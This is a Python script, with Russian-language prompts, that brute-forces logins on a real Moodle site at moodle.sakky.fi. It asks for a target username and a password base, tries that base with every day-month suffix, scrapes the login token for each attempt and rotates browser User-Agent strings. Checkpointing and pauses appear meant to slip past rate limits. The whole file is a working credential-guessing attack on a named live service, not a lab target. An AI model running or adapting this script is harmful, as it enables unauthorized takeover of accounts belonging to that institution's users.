import requests
from bs4 import BeautifulSoup
import time
import os
import random

DVWA_URL = "https://moodle.sakky.fi"
LOGIN_PAGE = f"{DVWA_URL}/login/index.php"

ATTACK_USERNAME = ""
PASS_BASE = ""

RATE_LIMIT_COUNT = 1
RATE_LIMIT_PAUSE = 5

START_DDMM = ""
RESUME_AFTER = True
USE_CHECKPOINT_FILE = False
CHECKPOINT_FILE = "checkpoint.txt"

STRICT_START = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

def get_user_input():
    global ATTACK_USERNAME, PASS_BASE
    while True:
        ATTACK_USERNAME = input("Введите имя пользователя для атаки: ").strip()
        PASS_BASE = input("Введите базу пароля: ").strip()
        print(f"\nВы ввели:\nИмя пользователя: {ATTACK_USERNAME}\nБаза пароля: {PASS_BASE}")
        confirm = input("Подтвердите ввод (y/n): ").strip().lower()
        if confirm == 'y':
            break
        elif confirm == 'n':
            print("Повторите ввод данных.\n")
        else:
            print("Некорректный ввод. Введите 'y' для подтверждения или 'n' для повторного ввода.\n")

def generate_passwords(base):
    days_in_month = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    for month in range(1, 13):
        for day in range(1, days_in_month[month-1] + 1):
            yield f"{base}{day:02d}{month:02d}"

def load_checkpoint():
    if not USE_CHECKPOINT_FILE:
        return None
    if not os.path.exists(CHECKPOINT_FILE):
        return None
    try:
        with open(CHECKPOINT_FILE, 'r') as f:
            val = f.read().strip()
            if val:
                return val
    except Exception:
        pass
    return None

def save_checkpoint(ddmm):
    if not USE_CHECKPOINT_FILE:
        return
    try:
        with open(CHECKPOINT_FILE, 'w') as f:
            f.write(ddmm)
    except Exception as e:
        print(f"[⚠️] Не удалось записать checkpoint: {e}")

def get_session_and_token(session):
    try:
        response = session.get(LOGIN_PAGE)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        login_token_input = soup.find('input', {'name': 'logintoken'})

        if login_token_input:
            login_token = login_token_input['value']
            return login_token
        else:
            return None

    except requests.exceptions.RequestException as e:
        return None

def attempt_login(session, username, password, token):
    login_data = {
        'logintoken': token,
        'anchor': '',
        'username': username,
        'password': password,
        'Log in': 'submit'
    }

    try:
        response = session.post(LOGIN_PAGE, data=login_data, allow_redirects=True, timeout=15)
    except requests.exceptions.RequestException as e:
        return False

    if response.status_code == 200:
        if response.url.endswith("/my/"):
            return True
        elif "Invalid login, please try again" in response.text or "логин или пароль" in response.text:
            return False
        else:
            return False
    else:
        return False

def main():
    get_user_input()
    user_agent = random.choice(USER_AGENTS)
    passwords = list(generate_passwords(PASS_BASE))
    total = len(passwords)
    if not passwords:
        return

    start_from = None

    ck = load_checkpoint()
    if ck:
        start_from = ck
        resume_after_for_checkpoint = True
    else:
        if START_DDMM:
            start_from = START_DDMM
            resume_after_for_checkpoint = RESUME_AFTER

    start_idx = 0
    if start_from:
        target = f"{PASS_BASE}{start_from}"
        try:
            pos = passwords.index(target)
            start_idx = pos + (1 if resume_after_for_checkpoint else 0)
            if start_idx >= total:
                return
        except ValueError:
            if STRICT_START:
                return
            else:
                start_idx = 0

    with requests.Session() as session:
        session.headers.update({"User-Agent": user_agent})

        tries = 0
        for idx in range(start_idx, total):
            password = passwords[idx]

            token = get_session_and_token(session)
            if token is None:
                break

            ok = attempt_login(session, ATTACK_USERNAME, password, token)

            ddmm = password[-4:]
            save_checkpoint(ddmm)

            if ok:
                return

            tries += 1

            if RATE_LIMIT_COUNT > 0 and ((idx + 1) % RATE_LIMIT_COUNT == 0) and ((idx + 1) != total):
                time.sleep(RATE_LIMIT_PAUSE)

if __name__ == "__main__":
    main()
